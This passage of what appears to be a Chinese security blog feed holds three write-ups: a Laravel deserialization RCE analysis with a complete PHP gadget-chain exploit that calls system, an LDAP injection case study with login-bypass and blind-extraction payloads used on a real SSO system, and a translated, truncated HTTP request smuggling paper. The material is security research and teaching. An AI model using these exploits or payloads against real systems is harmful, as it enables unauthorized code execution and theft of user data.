alt="image_1dhnv8s401hhqdai12u51uqgia1p.png-110.2kB"></p><p>接着我们从源头追pop。入口方法依然在<code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code>中，__destrcut执行dispatch函数<br><img src="http://static.zybuluo.com/1160307775/pdv4vp3nt9no1k94wb5jujkc/image_1dhnvcu1b1koj1f5o3oh9e1blr16.png" alt="image_1dhnvcu1b1koj1f5o3oh9e1blr16.png-108.5kB"></p><p>这次全局搜索哪些类存在dispatch函数，正好dispatcher本身中就存在，而且调用到了漏洞触发函数<code>dispatchToQueue</code>去执行<code>call_user_func</code></p><p><img src="http://static.zybuluo.com/1160307775/3vrpkiph81avi6cc2187ao5l/image_1dhnvi8t69udppb8bdhpo1sq11j.png" alt="image_1dhnvi8t69udppb8bdhpo1sq11j.png-167.8kB"></p><p>这里首先进行了如下条件判断</p><pre><code>$this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)</code></pre><p>跟进<code>commandShouldBeQueued</code>发现command参数必须是继承自    <code>ShouldQueue</code>接口的对象才能进入判断，这点我们可以通过序列化控制$command为对象。<br><img src="http://static.zybuluo.com/1160307775/9szugjpwpov3c0v9bj9r5so6/image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png" alt="image_1dhnvu6om1vfb1i9vfqrkjnk7u30.png-34.1kB"></p><p>只需要全局搜一下哪个类实现了<code>ShouldQueue</code>接口，这里使用<code>BroadcastEvent</code><br><img src="http://static.zybuluo.com/1160307775/7b6akvknkvytxn922rfymihj/image_1dho0anindq2h3e12jnoj3vl23t.png" alt="image_1dho0anindq2h3e12jnoj3vl23t.png-228.8kB"></p><p>判断走通回到dispather，进行函数<code>dispatchToQueue</code>调用，<code>$connection</code>参数取自<code>$command</code>的connection属性<br><img src="http://static.zybuluo.com/1160307775/er9kg4fp6hp4rdcgorvkjfut/image_1dho0e2svl3kjdg166r1qv61cae4a.png" alt="image_1dho0e2svl3kjdg166r1qv61cae4a.png-137.1kB"></p><p>但是<code>BroadcastEvent</code>没有connection属性。不过没有关系，我们自己序列化可以给类添加任何想要的属性。因为反序列化的时候不执行该类__contrust，自然也不会在<code>BroadcastEvent</code>中报错。</p><p>流程就这么简单，构造每个类的属性，让条件走通就行了。构造的exp</p><pre><code>&lt;?phpnamespace Illuminate\Broadcasting{    class PendingBroadcast    {        protected $events;        protected $event;        public function __construct($events, $event)        {            $this-&gt;events = $events;            $this-&gt;event = $event;        }    }    class BroadcastEvent    {      protected $connection;      public function __construct($connection)      {        $this-&gt;connection = $connection;      }    }}namespace Illuminate\Bus{    class Dispatcher{        protected $queueResolver;        public function __construct($queueResolver)        {          $this-&gt;queueResolver = $queueResolver;        }    }}namespace{    $command = new Illuminate\Broadcasting\BroadcastEvent(&quot;whoami&quot;);    $dispater = new Illuminate\Bus\Dispatcher(&quot;system&quot;);    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);    echo urlencode(serialize($PendingBroadcast));}</code></pre><p>只不过是没有回显，需要我们可以外带出去，这里调试的结果成功执行system获取whoami为hpdoger<br><img src="http://static.zybuluo.com/1160307775/72f5906tt0oafrk68hj4q2yl/image_1dho0phn5uka1c5316dv1g8n1ckr4n.png" alt="image_1dho0phn5uka1c5316dv1g8n1ckr4n.png-351.9kB"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Laravel由destrcuct引起的两处反序列化RCE分析&quot;&gt;&lt;a href=&quot;#Laravel由destrcuct引起的两处反序列化RCE分析&quot; class=&quot;headerlink&quot; title=&quot;Laravel由destrcuct引起的两处反序列化RCE分
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>从一次漏洞挖掘入门ldap注入</title>
    <link href="https://hpdoger.cn/2019/08/13/%E4%BB%8E%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8ldap%E6%B3%A8%E5%85%A5/"/>
    <id>https://hpdoger.cn/2019/08/13/从一次漏洞挖掘入门ldap注入/</id>
    <published>2019-08-12T16:00:00.000Z</published>
    <updated>2019-08-21T07:46:39.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从一次漏洞挖掘入门ldap注入"><a href="#从一次漏洞挖掘入门ldap注入" class="headerlink" title="从一次漏洞挖掘入门ldap注入"></a>从一次漏洞挖掘入门ldap注入</h1><p>原文首发于先知:<a href="https://xz.aliyun.com/t/5689" target="_blank" rel="noopener">https://xz.aliyun.com/t/5689</a></p><p>在最近的一次测试中，随缘摸到了一个sso系统，留给前台的功能只有登陆。</p><p>没有验证码，但是登陆点强制要求每个用户更改强密码，而且除了管理员和测试账号其他大部分都是工号形式，所以不考虑撞库。直接fuzz一把梭</p><p>测试过程中发现username对于下面payload会存在两种不同回显<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132645-4d1fa1ac-a78a-1.png" alt="image_1dfitlu921a2l2qg1qlf1ulrpaom.png-64.6kB"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132645-4d715baa-a78a-1.png" alt="image_1dfito82tqcipm01gsb8vt87g13.png-70.4kB"></p><p>当时我并不理解这种payload是什么库的数据格式。但是看到存在”!”字符时，页面的回显是不同的，而”!”在绝大多数语言中都是取反的表达形式，自然会产生不同的布尔值，那么无疑就是个xxx注入点了</p><h1 id="何为LDAP"><a href="#何为LDAP" class="headerlink" title="何为LDAP"></a>何为LDAP</h1><p>通过payload的类型，看到是经典的ldap注入语句。一种老协议和数据存储形式了</p><h2 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h2><p>LDAP(Lightweight Directory Access Protocol):即轻量级目录访问协议。是一种运行于TCP/IP之上的在线目录访问协议，主要用于目录中资源的搜索和查询。使用最广泛的LDAP服务如微软的ADAM(Active Directory Application Mode)和OpenLDAP</p><h2 id="LDAP存储"><a href="#LDAP存储" class="headerlink" title="LDAP存储"></a>LDAP存储</h2><p>MySQL数据库，数据都是按记录一条条记录存在表中。而LDAP数据库，是树结构的，数据存储在叶子节点上。</p><p>LDAP目录中的信息是按照树形结构组织的:</p><pre><code>dn:一条记录的位置dc:一条记录所属的区域ou:一条记录所属的组织cn/uid:一条记录的名字/ID</code></pre><p>这种树结构非常有利于数据的查询。首先要说明是哪一棵树(dc)，然后是从树根到目标所经过的所有分叉(ou)，最后就是目标的名字(cn/uid)，借用一张图来表明结构如下：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132646-4db2fcb8-a78a-1.png" alt="image_1dfivc13p1s9a19421h52facl6120.png-74.2kB"></p><h2 id="条目-amp-对象类-amp-属性"><a href="#条目-amp-对象类-amp-属性" class="headerlink" title="条目&amp;对象类&amp;属性"></a>条目&amp;对象类&amp;属性</h2><ul><li><p>条目(entry):是目录中存储的基本信息单元，上图每一个方框代表一个entry。一个entry有若干个属性和若干个值，有些entry还能包含子entry</p></li><li><p>对象类(obejectclass):对象类封装了可选/必选<strong>属性</strong>，同时对象类也是支持继承的。一个entry必须包含一个objectClass，且需要赋予至少一个值。而且objectClass有着严格的等级之分，最顶层是top和alias。例如，organizationalPerson这个objectClass就隶属于person，而person又隶属于top<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132646-4df19b8a-a78a-1.png" alt="image_1dfj1uep3pjh32v1bbe1oop16jk2d.png-11.8kB"></p></li><li><p>属性(atrribute):顾名思义，用来存储字段值。被封装在objectclass里的，每个属性(attribute)也会分配唯一的OID号码</p></li></ul><h2 id="LDAP查询语句"><a href="#LDAP查询语句" class="headerlink" title="LDAP查询语句"></a>LDAP查询语句</h2><p>一个圆括号内的判断语句又称为一个过滤器filter。</p><pre><code>( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter))</code></pre><h3 id="逻辑与-amp"><a href="#逻辑与-amp" class="headerlink" title="逻辑与&amp;"></a>逻辑与&amp;</h3><pre><code>(&amp;(username=Hpdoger)(password=ikun))</code></pre><p>查找name属性为Hpdoger并且password属性值为ikun的所有条目</p><h3 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或|"></a>逻辑或|</h3><pre><code>(|(username=Hpdoger)(displayname=Hpdoger))</code></pre><p>查找username或者displayname为Hpdoger的所有条目</p><h3 id="特殊说明"><a href="#特殊说明" class="headerlink" title="特殊说明"></a>特殊说明</h3><p>除使用逻辑操作符外，还允许使用下面的单独符号作为两个特殊常量</p><pre><code>(&amp;)     -&gt;Absolute TRUE (|)     -&gt;Absolute FALSE *       -&gt;通配符</code></pre><p>另外，默认情况下，LDAP的DN和所有属性都不区分大小写，即在查询时：</p><pre><code>(username=Hpdoger) &lt;=&gt; (username=HPDOGER)</code></pre><h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><p>由于LDAP的出现可以追溯到1980年，关于它的漏洞也是历史悠久。LDAP注入攻击和SQL注入攻击相似，利用用户引入的参数生成LDAP查询。攻击者构造恶意的查询语句读取其它数据/跨objectclass读取属性，早在wooyun时代就有师傅详细的剖析了这类漏洞。</p><p>上文说到LDAP过滤器的结构和使用得最广泛的LDAP：ADAM和OpenLDAP。然而对于下面两种情况</p><h2 id="无逻辑操作符的注入"><a href="#无逻辑操作符的注入" class="headerlink" title="无逻辑操作符的注入"></a>无逻辑操作符的注入</h2><p>情景：<code>(attribute=$input)</code></p><p>我们构造输入:<code>$input=value)(injected_filter</code></p><p>代入查询的完整语句就为:</p><pre><code>(attribute=value)(injected_filter)</code></pre><p>由于一个括号内代表一个过滤器，在OpenLDAP实施中，第二个过滤器会被忽略，只有第一个会被执行。而在ADAM中，有两个过滤器的查询是不被允许的。</p><p>因而这类情况仅对于OpenLDAP有一定的影响。</p><p>例如我们要想查询一个字段是否存在某值时，可以用<code>$input=x*</code>进行推移，利用页面响应不同判断x*是否查询成功</p><h2 id="带有逻辑操作符的注入"><a href="#带有逻辑操作符的注入" class="headerlink" title="带有逻辑操作符的注入"></a>带有逻辑操作符的注入</h2><pre><code>(|(attribute=$input)(second_filter))(&amp;(attribute=$input)(second_filter))</code></pre><p>此时带有逻辑操作符的括号相当于一个过滤器。此时形如value)(injected_filter)的注入会变成如下过滤器结构</p><pre><code>(&amp;(attribute=value)(injected_filter))(second_filter)</code></pre><p>虽然过滤器语法上并不正确，OpenLDAP还是会从左到右进行处理，忽略第一个过滤器闭合后的任何字符。一些LDAP客户端Web组成会忽略第二个过滤器，将ADAM和OpenLDAP发送给第一个完成的过滤器，因而存在注入。</p><p>举个最简单的登陆注入的例子，如果验证登陆的查询语句是这样:</p><pre><code>(&amp;(USER=$username)(PASSWORD=$pwd)) </code></pre><p>输入$username = <code>admin)(&amp;)(</code>使查询语句变为</p><pre><code>(&amp;(USER=admin)(&amp;))((PASSWORD=$pwd)) </code></pre><p>即可让后面的password过滤器失效，执行第一个过滤器而返回true，达到万能密码的效果。</p><h2 id="后注入分析"><a href="#后注入分析" class="headerlink" title="后注入分析"></a>后注入分析</h2><p>注入大致分为and、or类型这里就不赘述，感兴趣的可以看之前wooyun的文章：<br><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">LDAP注入与防御剖析</a></p><p>还有一个joomla的一个userPassword注入实例:<br><a href="https://www.anquanke.com/post/id/86899" target="_blank" rel="noopener">Joomla! LDAP注入导致登录认证绕过漏洞</a></p><h1 id="回到实例"><a href="#回到实例" class="headerlink" title="回到实例"></a>回到实例</h1><p>大致了解注入类型，就开始了第一轮尝试</p><p>当通配符匹配到用户名时返回<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132647-4e7d6dae-a78a-1.png" alt="image_1dfj9gu7f1d261ad2o9jao3q082q.png-40.1kB"></p><p>用户名不存在时返回<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4ecb7d3c-a78a-1.png" alt="image_1dfj9iml33968bod9etnogsu3n.png-49.7kB"></p><p>构造用户名恒真<code>username=admin)(%26&amp;password=123</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4ee14e8c-a78a-1.png" alt="image_1dfj9mj071drl59b37j21teu544.png-49.7kB"></p><p>说明它判断用户的形式并不是<code>(&amp;(USER=$username)(PASSWORD=$pwd))</code>，因为我们查到的用户名是true，但是验证密码false</p><p>由于自己也没搞过LDAP的开发..就盲猜后端应该就是这种情况:<br>执行了<code>(&amp;(USER=$username)(objectclass=xxx))</code>后，取password与$password进行对比</p><h2 id="ACTION"><a href="#ACTION" class="headerlink" title="ACTION"></a>ACTION</h2><p>那么首先要知道它继承了哪些objectclass？因为树结构都有根，使我们能顺藤摸瓜。首先是top肯定存在，回显如下:<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132648-4f4b148e-a78a-1.png" alt="image_1dfje9v39cu01n95u4fqln1ed9.png-36.9kB"></p><p>但是top的子类太多了，先fuzz一下objectclass的值缩小范围，payload：</p><pre><code>username=admin)(objectclass%3d$str</code></pre><p>发现存在<strong>person</strong>和<strong>user</strong>两个objectclass</p><p>再fuzz一下attribute得到的值如下:</p><pre><code>username=admin)($str%3d*</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-4ff6ba6e-a78a-1.png" alt="image_1dfjehfm71qa71ri11b481mj9183m.png-80.2kB"></p><p>凭借这些信息去LDAP文档里溯继承链，先去找user类，继承自organizationalPerson<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-5033cd5a-a78a-1.png" alt="image_1dfjeub3c1dfvnb5dv6k61i7l13.png-67.3kB"></p><p>同理organizationalperson又是继承自person的，person继承自top，最终的继承链为：</p><pre><code>top-&gt;person-&gt;organizationalperson-&gt;user</code></pre><p>也就是说这些类存在的属性都可能被调用。很遗憾的是我并没有fuzz到password类型参数，一般来说password会以userPassword的形式存储在person对象中，很多基于ldap的开发demo中也是这样写的。</p><p>但是userPassword毕竟也只是person类可选的属性，开发大概率是改名或者重写属性了，这也是这个漏洞没有上升到严重危害的瓶颈点<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132650-50554700-a78a-1.png" alt="image_1dfki06dp1sqm147onc11odt3at13.png-127.9kB"></p><p>不过依然可以注出一些有用的数据。例如所有用户的用户名、邮箱、手机号、姓名、性别等等，说不定以后可以越权修改某账号性别呢-3-</p><h3 id="盲注mobile"><a href="#盲注mobile" class="headerlink" title="盲注mobile"></a>盲注mobile</h3><p>尝试注入管理员的手机号mobile</p><pre><code>username=admin)(mobile=%s*&amp;password=123</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-50b0e8f8-a78a-1.png" alt="image_1dfkgoopj19s4kkkq0sulvmp4m.png-52.6kB"></p><p>利用通配符不断添加数字，同理邮箱也可以注出来，与sql盲注的思路相同。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-50c968d8-a78a-1.png" alt="image_1dfl7ap4k1pna18bk17ec24166o2n.png-42.3kB"></p><h3 id="盲注username"><a href="#盲注username" class="headerlink" title="盲注username"></a>盲注username</h3><p>毕竟对于sso，收集username是很有用的信息。那么问题来了，我们是可以通过生成字典来遍历存在的用户名，但是这个工作量是指数倍的增长，一天能跑完一个字母开头的就不错了，而且浪费了通配符的作用。</p><p>可是又想做到无限迭代把所有用户一个不漏的跑完，passer6y师傅提醒我用笛卡尔积</p><p>最后画出来的流程图大致如下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190716132651-512168da-a78a-1.png" alt="image_1dfkks6d86j6ra51m7821d3831g.png-87.6kB"></p><p>最后测试用户大概有1w多，然而这些大部分是测试帐号，未授权的情况下也不能跑具体数据，但也算是验证了思路的可执行性。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>网上关于这类漏洞的fuzz思路也比较久远了，第一次接触这种漏洞，若文章思路如果有什么不对的地方还请师傅们斧正。自己对这类漏洞的姿势理解很浅，现在漏洞已经修复，但是如果有师傅对于password的注入有想法，可以私下交流一下</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p><a href="https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</a><br><a href="https://www.cnblogs.com/pycode/p/9495808.html" target="_blank" rel="noopener">https://www.cnblogs.com/pycode/p/9495808.html</a><br><a href="https://zhuanlan.zhihu.com/p/32732045" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32732045</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从一次漏洞挖掘入门ldap注入&quot;&gt;&lt;a href=&quot;#从一次漏洞挖掘入门ldap注入&quot; class=&quot;headerlink&quot; title=&quot;从一次漏洞挖掘入门ldap注入&quot;&gt;&lt;/a&gt;从一次漏洞挖掘入门ldap注入&lt;/h1&gt;&lt;p&gt;原文首发于先知:&lt;a href=&quot;h
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>HTTP Desync Attacks-Smashing into the Cell Next Door</title>
    <link href="https://hpdoger.cn/2019/08/10/HTTP%20Desync%20Attacks-Smashing%20into%20the%20Cell%20Next%20Door/"/>
    <id>https://hpdoger.cn/2019/08/10/HTTP Desync Attacks-Smashing into the Cell Next Door/</id>
    <published>2019-08-09T16:00:00.000Z</published>
    <updated>2019-08-21T07:50:23.156Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP-Desync-Attacks-Smashing-into-the-Cell-Next-Door"><a href="#HTTP-Desync-Attacks-Smashing-into-the-Cell-Next-Door" class="headerlink" title="HTTP Desync Attacks-Smashing into the Cell Next Door"></a>HTTP Desync Attacks-Smashing into the Cell Next Door</h1><p>文章转载议题:<a href="https://www.blackhat.com/us-19/briefings/schedule/index.html#http-desync-attacks-smashing-into-the-cell-next-door-15153(相关文章资源放到文章结尾)" target="_blank" rel="noopener">https://www.blackhat.com/us-19/briefings/schedule/index.html#http-desync-attacks-smashing-into-the-cell-next-door-15153(相关文章资源放到文章结尾)</a></p><p>James Kettle - <a href="mailto:james.kettle@portswigger.net" target="_blank" rel="noopener">james.kettle@portswigger.net</a> - @albinowax</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>传统上，HTTP请求被视为独立的独立实体。在本文中，我将探讨一种远程、未经身份验证的攻击者能够打破这种隔离并将其请求转接到其他人身上的技术。通过这种技术，我可以在众多商业和军事系统的WEB基础应用上扮演一位操作者，在他们的虚拟环境中使用漏洞，并且在bug bounties中获得超过6万美元</p><p>将这些目标作为案例研究，我将向您展示如何巧妙地修改受害者的请求，以将其路由到恶意领域，调用有害的响应。我还将演示在您自己的请求中使用后端重组，攻击基于前端的各种信任，获得对内部API的最大特权访问，投毒Web缓存，并危及paypal的登录页面。</p><p>HTTP Request Smuggling(后文称为请求走私)最初是由WatchFire1于2005年记录下来的，但由于其困难和附带损害的可怕名声，使得当Web服务的敏感性增常期间，它大多被忽视。除了新的攻击变种和利用途径之外，我将帮助您使用定制的开源工具和一种改进的方法来处理这一遗留问题，以最小的风险进行可靠的黑盒检测、评估和利用</p><h2 id="Core-concepts"><a href="#Core-concepts" class="headerlink" title="Core concepts"></a>Core concepts</h2><p>自HTTP/1.1以来，通过一个底层TCP或SSL/TLS套接字发送多个HTTP请求被广泛支持。这个协议非常简单——HTTP请求只需背靠背地放置，服务器解析报头就可以知道每个报头的结束位置和下一个报头的开始位置。这经常与HTTP pipeline2混淆，后者是少见的类型，在本文的攻击描述中不予介绍。</p><p>这本身是无害的。然而，现代网站是由一系列的系统组成的，都是通过HTTP进行对话的。此多层体系结构接收来自多个不同用户的HTTP请求，并通过单个TCP/TLS连接将其路由：<br><img src="http://static.zybuluo.com/1160307775/5zcoyljdq16xzvsz5wbnna62/image_1dhtfhnrdqvspfo15j4no1tuqp.png" alt="image_1dhtfhnrdqvspfo15j4no1tuqp.png-22.8kB"></p><p>这意味着，后端与前端关于“每条消息在哪里结束”达成一致是至关重要的。否则，攻击者可能会发送一条不明确的消息，使后端将其解释为两个不同的HTTP请求</p><p><img src="http://static.zybuluo.com/1160307775/ornlfq2wbqh1jf5r7dzed55y/image_1dhtfsok51vkp1c6g7rb1sku1gnm1m.png" alt="image_1dhtfsok51vkp1c6g7rb1sku1gnm1m.png-26kB"></p><p>这使攻击者能够在下一个合法用户请求开始时预先处理任意内容。在本文中，走私内容将被称为“前缀”，并以橙色突出显示。</p><p>让我们假设前端浏览器优先处理第一个内容长度头，后端优先处理第二个内容长度头。从后端的角度来看，TCP流可能看起来像：</p><p><img src="http://static.zybuluo.com/1160307775/m2v46k8ligt8vtjxbvzvcdck/image_1dhtg6sgu16rlhn09bi1779smo3q.png" alt="image_1dhtg6sgu16rlhn09bi1779smo3q.png-21.7kB"></p><p>在引擎中，前端浏览器将蓝色和橙色数据转发到后端，后端在发出响应之前只读取蓝色内容。这使得后端套接字受到橙色数据的污染。当合法的绿色请求到达时，它最终附加到橙色内容上，导致意外的响应。</p><p>在这个例子中，注入的“G”会破坏绿色用户的请求，他们可能会得到“未知方法GPOST”的响应。</p><p>本文中的每个攻击都遵循这个基本格式。WatchFire论文描述了一种称为“反向请求走私”的替代方法，但这依赖于前端和后端系统之间的管道连接，因此很少有选择。</p><p>在现实生活中，双content-length技术很少起作用，因为许多系统明智地拒绝具有多个内容长度头的请求。相反，我们将使用分块编码攻击系统-这次我们利用RFC2616规范：</p><p><strong>如果接收的消息同时包含传输编码头字段和内容长度头字段，则必须忽略后者</strong></p><p>由于规范默许使用传输编码（分块编码和内容长度）处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，从一个服务器上将传输编码头隐藏在一个链中的时，它将返回到使用内容长度，并且我们可以取消整个系统的同步。</p><p>您可能不太熟悉分块编码，因为像Burp Suite这样的工具会自动将分块的请求/响应缓冲到常规消息中，以便于编辑。在分块的消息中，正文由0个或多个分块组成。每个块由块大小、换行符和块内容组成。消息以0大小的块终止。以下是使用分块编码进行的简单失步攻击：</p><p><img src="http://static.zybuluo.com/1160307775/re8piqva834m983ljgcg4sh9/image_1dhthci68dal13houlsiv8brk47.png" alt="image_1dhthci68dal13houlsiv8brk47.png-22.3kB"></p><p>我们没有在这里隐藏传输编码头，因此此漏洞主要适用于前端根本不支持分块编码的系统，这在使用内容交付网络Akamai的许多网站上都可以看到。</p><p>如果后端不支持分块编码，我们需要翻转偏移量：<br><img src="http://static.zybuluo.com/1160307775/41818gek0g1258ed5ud1uz9d/image_1dhthmclj6hn11mehtq1ko2ikn4k.png" alt="image_1dhthmclj6hn11mehtq1ko2ikn4k.png-24.6kB"></p><p>这种技术在相当多的系统上都起作用，但是我们可以通过使传输编码头稍微难以被发现来利用更多的资源，这样一个系统就看不到它。这可以通过使用服务器的HTTP解析中的差异来实现。下面是一些只有部分服务识别传输编码的请求示例：分块头。在本研究中，每个都成功地用于攻破至少一个系统：</p><p><img src="http://static.zybuluo.com/1160307775/qzi15zyia3alxga9sragpspx/image_1dhtj1skk1mim1naa1l2a1toq1ig051.png" alt="image_1dhtj1skk1mim1naa1l2a1toq1ig051.png-52kB"></p><p>如果前端和后端服务器都有这些处理，那么每个处理都是无害的，否则都是一个重大威胁。有关更多技术，请查看Regilero正在进行的research4.。我们稍后将使用其他技术查看实际示例。</p><h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><p>请求走私背后的理论是直截了当的，但是不受控制变量的数量和我们对前端所发生事情的完全不了解会导致复杂的情况。</p><p>我已经开发了应对这些挑战的技术和工具，并将它们组合成以下简单的方法，我们可以利用这些方法来追查请求的走私漏洞并证明其影响：<br><img src="http://static.zybuluo.com/1160307775/4avwsjuodz5s97mcmuq4ql8c/image_1dhtjaght12mlo3grs1q0rtko5e.png" alt="image_1dhtjaght12mlo3grs1q0rtko5e.png-19.7kB"></p><h2 id="Detect"><a href="#Detect" class="headerlink" title="Detect"></a>Detect</h2><p>检测请求走私漏洞的明显方法是发出一个含糊不清的请求，然后发出一个正常的“受害者”请求，然后观察后者是否得到意外的响应。但是，这极易受到干扰；如果另一个用户的请求在受害者请求之前击中中毒的套接字，那么他们将得到损坏的响应，我们将不会发现该漏洞。这意味着，在流量很大的网站，如果不在过程中利用大量用户去测试，就很难证明存在<strong>请求走私</strong>漏洞。即使在没有其他流量的站点上，您也会面临应用程序级异常终止连接所导致的错误否定的风险。</p><p>为了解决这个问题，我开发了一种检测策略，它使用一系列消息，使得易受攻击的后端系统挂起并超时连接。这种技术几乎没有误报，可以抵抗应用程序级的行为从而导致的误报，最重要的是，它几乎没有影响其他用户的风险。</p><p>假设前端服务器使用Content-Length头，后端使用Transfer-Encoding头。我简称这个目标为cl.te。我们可以通过发送以下请求来检测潜在的请求走私：</p><p><img src="http://static.zybuluo.com/1160307775/15im6vs0brbtf61gd6zm1jv6/image_1dhtjsm7t4jo1tun14v4a174ri5r.png" alt="image_1dhtjsm7t4jo1tun14v4a174ri5r.png-17.5kB"></p><p>由于内容长度较短，前端将只转发蓝色文本，后端将在等待下一个块大小时超时。这将导致可观察到的时间延迟。</p><p>如果两个服务器都是同步的（te.te或cl.cl），则前端将拒绝该请求，或者两个系统都将无害地处理该请求。最后，如果从另一个角度（te.cl）执行去同步，由于块大小“q”无效，前端将拒绝消息而不将其转发到后端。这可以防止后端套接字中毒。</p><p>我们可以使用以下请求安全地检测te.cl去同步：<br><img src="http://static.zybuluo.com/1160307775/fvkyn0yeyjzy0pff2in1qg4u/image_1dhtk3jth1s2k11e51o9h15291qqh68.png" alt="image_1dhtk3jth1s2k11e51o9h15291qqh68.png-17.4kB"></p><p>由于“0”分块的终止，前端将只转发蓝色文本，后端将超时等待X到达。</p><p>如果Desync以另一种方式发生（cl.te），那么这种方法将使用”X”毒害后端套接字，可能会危害合法用户。幸运的是，通过始终运行首先检测方法，我们可以排除这种可能性。</p><p>这些请求可以针对头解析中的任意差异进行调整，并用于通过取消Desynchronize5自动识别请求走私漏洞-一个开发用于帮助此类攻击的开源Burp Suite 扩展。它们现在也用于Burp Suite的scanner。尽管这是一个服务器级的漏洞，但单个域上的不同端点通常路由到不同的目标，因此该技术应单独应用于每个端点。</p><h2 id="Confirm"><a href="#Confirm" class="headerlink" title="Confirm"></a>Confirm</h2><p>在这一点上，您已经尽了最大努力，而不会给其他用户带来副作用的风险。然而，许多客户不愿意在没有进一步证据的情况下认真对待报告，所以这就是我们将要克服的。证明请求走私的全部危害的下一步是证明后端套接字中毒是可能的。为此，我们将发出一个旨在毒害后端套接字的请求，然后发出一个希望成为毒害受害者的请求，明显地改变了响应。</p><p>如果第一个请求导致错误，后端服务器可能会决定关闭连接，丢弃中毒缓冲区并破坏攻击。尝试通过将设计用于接受POST请求的端点作为目标，并保留任何预期的GET/POST参数来避免这种情况。</p><p>有些站点有多个不同的后端系统，前端查看每个请求的方法、URL和头，以决定将其路由到何处。如果受害者请求路由到与攻击请求不同的后端，那么攻击将失败。因此，“攻击”和“受害者”请求最初应尽可能相似。</p><p>如果目标请求看起来像：<br><img src="http://static.zybuluo.com/1160307775/988vcjqwqvtxw9bigenwnjv3/image_1dhv43t4jmhm12pc1rdo1oe61bn86l.png" alt="image_1dhv43t4jmhm12pc1rdo1oe61bn86l.png-23.2kB"></p><p>那么，一次CL.TE毒害攻击尝试看起来像是：<br><img src="http://static.zybuluo.com/1160307775/xogz4l7vzvbexan7rd1f1fdv/image_1dhv465pn1if7lah1iqrh5st572.png" alt="image_1dhv465pn1if7lah1iqrh5st572.png-43.3kB"></p><p>如果攻击成功，受害者请求（绿色）将得到404响应。</p><p>te.cl攻击看起来很相似，但是需要一个封闭块，这意味着我们需要自己指定所有的头，并将受害者请求放在正文中。确保前缀中的内容长度略大于正文：</p><p><img src="http://static.zybuluo.com/1160307775/nr7oeij645povxo3wrvdcdrh/image_1dhv4boe01rjp1s361dut1c8o8aj7f.png" alt="image_1dhv4boe01rjp1s361dut1c8o8aj7f.png-59.1kB"></p><p>如果一个站点是运行的，另一个用户的请求可能会击中您之前投毒的套接字，这将使您的攻击失败，并可能使用户不安。因此，此过程通常需要进行几次尝试，在高流量站点上可能需要数千次尝试。所以请谨慎和克制行为</p><h2 id="Explore"><a href="#Explore" class="headerlink" 